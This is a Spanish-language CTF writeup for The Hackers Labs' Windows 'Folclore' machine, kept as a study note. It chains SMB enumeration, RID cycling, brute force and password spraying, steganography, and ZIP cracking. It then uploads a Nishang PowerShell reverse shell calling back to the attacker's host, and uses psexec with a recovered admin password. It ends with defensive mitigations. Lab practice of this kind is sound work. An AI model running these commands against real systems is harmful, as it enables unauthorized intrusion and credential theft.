---
tags: [ctf, thehackerslabs, windows, smb, steganography, volatility-not, writeup]
plataforma: The Hackers Labs
os: Windows 10 (Build 19041)
dificultad: media
estado: Resuelto
fecha: 2026-10-20
---

# Folclore — Roadmap / Writeup

> [!success] Resultado
> - **USER flag:** `456e20656c207669656e746f2079616365206c6120766572646164` → `En el viento yace la verdad` (escritorio de `Quetzalcoatl`)
> - **ROOT flag:** `456e20656c207669656e746f2079616365206c6120766572644444` → `En el viento yace la verdDD` (escritorio de `Administrador`)
> - **Password Administrador:** `WwU@49F*`

Nota principal: [[Folclore]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo | `192.168.56.105` |
| Kali (atacante) | `192.168.56.1` (vboxnet0, Host-Only) |
| Hostname / Workgroup | `FOLCLORE` / `Folclore` |
| SO | Windows 10 / Server 2019 Build 19041 |
| Puertos abiertos | `139`, `445`, `7680` (DoSvc) + `137/udp` |
| SMB signing | enabled but **not required** |

> [!tip] Ajuste previo de red de la VM
> La VM arrancaba con una **NAT Network inexistente** (`NatNetwork`). Se cambió a Host-Only para atacarla desde Kali:
> ```bash
> VBoxManage modifyvm "The Hackers Labs - Folclore" --nic1 hostonly --hostonlyadapter1 vboxnet0 --cableconnected1 on
> VBoxManage startvm "The Hackers Labs - Folclore" --type headless
> nmap -sn -PR 192.168.56.0/24     # localizar la IP
> ```

---

## 1. Reconocimiento

```bash
nmap -sS -p- --min-rate 3000 -Pn 192.168.56.105
nmap -sS -sV -sC -Pn -p 139,445,7680 192.168.56.105
```

- Solo **SMB (139/445)** y **7680 (Delivery Optimization)**. El 7680 es un artefacto, no explotable aquí.
- NetBIOS: `FOLCLORE`; SMB 3.1.1; **firma habilitada pero no requerida** (posible relay, irrelevante en esta ruta).

---

## 2. Enumeración SMB — sesión nula / invitado

```bash
nxc smb 192.168.56.105                       # signing: False
nxc smb 192.168.56.105 -u guest -p ''        # (Guest)  -> sesión válida
smbclient -L //192.168.56.105 -N             # lista shares y sus comentarios-pista
```

**Shares temáticos (pistas en los comentarios):**

| Share | Comentario-pista |
|---|---|
| `Oro` | *¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.* |
| `Libertad` | *El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.* |
| `Lluvia` | *…en esta imagen el camino se revela sólo a quien sabe escuchar el trueno* |
| `Viento` | *El viento sagrado ejecutará la tarea a su debido tiempo* |
| `Dia de Muertos` | *Al final, todos somos polvo y hueso.* |
| `Santuario` | *El Refugio de Ixchel* |

> [!note] Sin credenciales no se puede listar el contenido (solo `IPC$` READ). Hay que obtener usuarios y contraseña.

### RID Cycling (con usuario `guest`)
```bash
nxc smb 192.168.56.105 -u guest -p '' --rid-brute
```
Usuarios encontrados (RID):

| RID | Usuario |
|---|---|
| 1001 | `Quetzalcoatl` |
| 1003 | `El_charro_negro` |
| 1004 | `Ix_Chel` |
| 1005 | `Tlaloc` |
| 1006 | `La_mulata_de_Cordoba` |
| 1007 | `La_Catrina` |

---

## 3. Fase 1 — Fuerza bruta → `El_charro_negro` (password EXPIRADA)

```bash
nxc smb 192.168.56.105 -u El_charro_negro -p /usr/share/wordlists/rockyou.txt \
    --ignore-pw-decoding | grep -v 'STATUS_LOGON_FAILURE'
# [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED
```

> [!warning] Contraseñas CADUCADAS
> Todas las cuentas de la máquina tienen la password **expirada**. `STATUS_PASSWORD_EXPIRED` = **la password es correcta**, pero hay que cambiarla.
> **Windows 10 build 19041 NO permite cambiarla por SMB** (al expirar, el servidor **elimina la sesión**: `STATUS_USER_SESSION_DELETED` / `ACCESS_DENIED` en el pipe `samr`). → **Cambio por GUI** (consola de VirtualBox) como en los writeups.

```bash
# Verificar tras el cambio por GUI
nxc smb 192.168.56.105 -u El_charro_negro -p 'abc1234'
```

### 3.1 Imagen `Oro` → contraseña de `Ix_Chel` (metadatos)
```bash
smbclient //192.168.56.105/Oro -U 'El_charro_negro%abc1234' -c 'ls; get El_Charro_Negro.jpeg'
exiftool El_Charro_Negro.jpeg
# Copyright : ... Busca a Ix Chel ... aqui tienes la clave: 4+9Ii1wK
```
→ **`Ix_Chel : 4+9Ii1wK`** (cambiar por GUI).

---

## 4. Fase 2 — Cadena de shares (cada usuario revela el siguiente)

### `Ix_Chel` → share `Santuario`
```bash
smbclient //192.168.56.105/Santuario -U 'Ix_Chel%ixchel123' -c 'ls; get "La clave de Kukulcán.txt"'
```
>*…Continua buscando a Tláloc, te despejaré el camino entregándote su clave: `677Kn$q`.*
>Y recuerda: la clave de Quetzalcóatl tiene **8 caracteres**.*

→ **`Tlaloc : 677Kn$q`**

### `Tlaloc` → share `Lluvia` (esteganografía)
```bash
smbclient //192.168.56.105/Lluvia -U 'Tlaloc%tlaloc123' -c 'ls; get Tlaloc.jpg'
stegseek Tlaloc.jpg /usr/share/wordlists/rockyou.txt
# [i] Found passphrase: "knight"
cat Tlaloc.jpg.out
```
>*…los últimos dos caracteres para la clave de Kukulcán: `%/`… Además, otra clave: `45yD#k7`.*

→ pista: últimos 2 chars de Quetzalcóatl = `%/`; password suelta **`45yD#k7`**

### Password Spraying → `La_mulata_de_Cordoba`
```bash
nxc smb 192.168.56.105 -u usuarios.txt -p '45yD#k7' --no-bruteforce --continue-on-success
# [-] Folclore\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED
```

### `La_mulata_de_Cordoba` → share `Libertad` (TXT + ZIP)
```bash
smbclient //192.168.56.105/Libertad -U 'La_mulata_de_Cordoba%cordoba123' \
  -c 'ls; get Mi_amiga.txt; get Pacto.zip'
```
`Mi_amiga.txt` → *Mi amiga La Catrina… su clave: `3nM93{S#`* → **`La_Catrina : 3nM93{S#`**

Crackeo del ZIP:
```bash
zip2john Pacto.zip > zipHash
john -w:/usr/share/wordlists/rockyou.txt zipHash      # password: celina
7z x Pacto.zip                                        # Pacto.txt
```
`Pacto.txt` → *…sólo tres caracteres… de su secreto: `J9c`.*

→ pista: primeros 3 chars de Quetzalcóatl = `J9c`

### `La_Catrina` → share `Dia de Muertos`
```bash
smbclient '//192.168.56.105/Dia de Muertos' -U 'La_Catrina%catrina123' \
  -c 'ls; get Ultimo_mensaje.txt'
```
>*…el quinto carácter de su clave: `U`… solo son números o letras.*

→ pista: 5º char de Quetzalcóatl = `U`

---

## 5. Fase 3 — Contraseña de `Quetzalcoatl` (fuerza bruta dirigida)

Plantilla conocida de la clave (8 chars):
```
J9c ? U ? % /
```
El 4º carácter falta (letra o número). **Ambas posiciones `?` deben ser iguales** (los writeups generan `J9c<X>U<X>%/`).

```bash
# Generar wordlist
for c in {a..z} {A..Z} {0..9}; do printf "J9c%sU%s%%/\n" "$c" "$c"; done > wordlist.txt
# o con hashcat:
hashcat -a 3 --stdout -1 ?l?u?d 'J9c?1U?1%/' > wordlist.txt

nxc smb 192.168.56.105 -u Quetzalcoatl -p wordlist.txt | grep -v 'STATUS_LOGON_FAILURE'
# [+] Folclore\Quetzalcoatl:J9c7U7%/
```
→ **`Quetzalcoatl : J9c7U7%/`** (cambiar por GUI → `J9c7U7%/` … recordar el cambio)

---

## 6. Fase 4 — Reverse shell (share `Viento`) = USER FLAG

`Quetzalcoatl` tiene **READ,WRITE** en `Viento`. El archivo `Serpiente Emplumada.txt` dice:
>*Sólo ejecutaré **una vez** aquel archivo **PowerShell** que decidas subir…*

→ parece una **tarea programada** que ejecuta un `.ps1` subido al share.

```bash
# 1) Reverse shell PowerShell (Nishang)
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.1 -Port 443' >> Invoke-PowerShellTcp.ps1

# 2) Listener
rlwrap nc -nlvp 443

# 3) Subir el .ps1 al share Viento
smbclient //192.168.56.105/Viento -U 'Quetzalcoatl%J9c7U7%/' -c 'put Invoke-PowerShellTcp.ps1'
```

Shell recibida como `folclore\quetzalcoatl`:
```powershell
whoami
cd Desktop; type User.txt
# 456e20656c207669656e746f2079616365206c6120766572646164   -> En el viento yace la verdad
```

---

## 7. Fase 5 — Escalada a Administrador = ROOT FLAG

Contraseña del admin **en claro** en el perfil de Quetzalcoatl:
```powershell
cd C:\Users\Quetzalcoatl\Downloads\Actualizacion
type Venganza.txt
# He conseguido la clave del administrador!!!
# La guardare para no olvidarla: WwU@49F*
```

Validar y escalar:
```bash
nxc smb 192.168.56.105 -u Administrador -p 'WwU@49F*'        # (Pwn3d!)
impacket-psexec Folclore/Administrador:'WwU@49F*'@192.168.56.105
```
Dentro:
```cmd
C:\> type C:\Users\Administrador\Desktop\Root.txt
456e20656c207669656e746f2079616365206c6120766572644444     -> En el viento yace la verdDD
```

---

## 8. Resumen de la kill chain

```
guest (RID cycling)
  └─ rockyou → El_charro_negro:abc123 (EXPIRADA) ─GUI→ abc1234
        └─ share Oro → El_Charro_Negro.jpeg (EXIF) → Ix_Chel:4+9Ii1wK
              └─ share Santuario → "La clave de Kukulcán.txt" → Tlaloc:677Kn$q
                    └─ share Lluvia → Tlaloc.jpg (stegseek "knight") → 45yD#k7
                          └─ spraying → La_mulata_de_Cordoba:45yD#k7
                                └─ share Libertad → Mi_amiga.txt (La_Catrina) + Pacto.zip (john "celina") → J9c
                                      └─ share "Dia de Muertos" → Ultimo_mensaje.txt → U + %/
                                            └─ wordlist J9c?U?%/ → Quetzalcoatl:J9c7U7%/  ─── USER FLAG
                                                  └─ share Viento → subir .ps1 → reverse shell (Quetzalcoatl)
                                                        └─ Venganza.txt → Admin:WwU@49F* → psexec ─── ROOT FLAG
```

---

## 9. Flags

| Flag | Valor (hex en el fichero) | Decodificado |
|---|---|---|
| USER | `456e20656c207669656e746f2079616365206c6120766572646164` | `En el viento yace la verdad` |
| ROOT | `456e20656c207669656e746f2079616365206c6120766572644444` | `En el viento yace la verdDD` |

---

## 10. Técnicas para estudiar (checklist)

- [ ] **RID Cycling** sobre SMB (`nxc --rid-brute`) para enumerar usuarios sin credenciales
- [ ] **Fuerza bruta SMB** con rockyou + interpretación de `STATUS_PASSWORD_EXPIRED`
- [ ] Cambio de contraseña **expirada** en Windows (SMB bloquea → GUI/consola)
- [ ] **EXIF / metadatos** de imágenes (exiftool) → [[Esteganografía - Metadatos]]
- [ ] **Steganografía LSB + passphrase** (`stegseek` + rockyou) → [[Esteganografía - Stegseek]]
- [ ] **Password spraying** dirigido y **crackeo de ZIP** (`zip2john` + john)
- [ ] **Construcción de wordlist** con patrón conocido (hashcat `-a 3 --stdout`)
- [ ] **Share escribible + tarea programada** → carga de `.ps1` → reverse shell
- [ ] **Credenciales en claro** en el perfil → `psexec` para SYSTEM

## 11. Mitigaciones (lado defensa)

- Deshabilitar **sesión nula / Invitado**; exigir **SMB signing**.
- **Política de contraseñas**: forzar rotación y **no** reutilizar temáticas débiles; eliminar cuentas antiguas.
- **No** dejar secretos en metadatos de imágenes ni en ficheros de texto del perfil.
- Revisar **comparticiones SMB** con permisos de escritura y tareas programadas que ejecutan scripts de ubicaciones de usuario.
- **LAPS** para cuentas locales de administrador; no guardar la clave del admin en texto claro.
- Endurecer cuentas locales: sin contraseñas expiradas eternas, bloqueo de intentos fallidos.
